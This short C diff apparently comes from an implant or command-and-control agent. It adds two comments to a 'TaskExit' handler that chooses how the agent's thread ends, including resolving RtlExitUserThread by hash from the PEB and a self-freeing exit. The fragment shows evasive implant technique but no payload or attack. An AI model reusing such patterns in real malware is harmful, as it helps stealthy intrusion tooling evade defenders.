@@ -58,9 +58,11 @@ D_SEC( B ) DWORD TaskExit( _In_ PROGUE_CTX Context, _In_ USHORT Uid, _In_ PVOID 
 			Context->Exit = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLEXITUSERTHREAD );
 			break;
 		case 2:
+			/* Exit the current thread and free ourself */
 			Context->Exit = C_PTR( G_PTR( ExitFreeThread ) );
 			break;
 		case 3:
+			/* Exit and return */
 			Context->Exit = NULL;
 			break;
 	};
